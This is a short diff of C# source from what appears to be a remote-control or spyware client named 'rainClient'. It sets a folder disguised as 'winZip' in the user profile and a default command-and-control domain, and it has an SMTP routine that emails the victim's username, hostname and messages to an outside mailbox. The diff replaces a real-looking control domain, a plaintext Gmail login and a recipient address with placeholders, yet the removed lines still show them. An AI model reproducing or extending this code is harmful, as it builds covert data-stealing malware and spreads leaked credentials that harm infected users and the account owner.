@@ -23,7 +23,7 @@ namespace rainClient
         public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
 
         public static string puth = String.Format("{0}\\UserProfile\\winZip", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
-        public static string defaultDomain = <domain>"http://ganter-001-site1.etempurl.com"</domain>;
+        public static string defaultDomain = <domain>"http://defaultDomain.com"</domain>;
         private static object locker = new object();
 
         static GO()
@@ -90,9 +90,9 @@ namespace rainClient
         {            
             new SmtpClient("smtp.gmail.com", 587)
             {
-                Credentials = new NetworkCredential("server1crow@gmail.com", "warface0073"),
+                Credentials = new NetworkCredential("mail@gmail.com", "mailpaswd"),
                 EnableSsl = true
-            }.Send(new MailMessage(new MailAddress("server1crow@gmail.com", "Naruto"), new MailAddress("4el0073@mail.ru"))
+            }.Send(new MailMessage(new MailAddress("mail@gmail.com", "Naruto"), new MailAddress("TOmail@gmail.com"))
             {
                 Subject = "Hi",
                 Body = String.Format("<h2>UserName {0} </h2><h2>HostName {1}</h2><h2>Message {2}</h2>", Environment.UserName, Dns.GetHostName(), message),
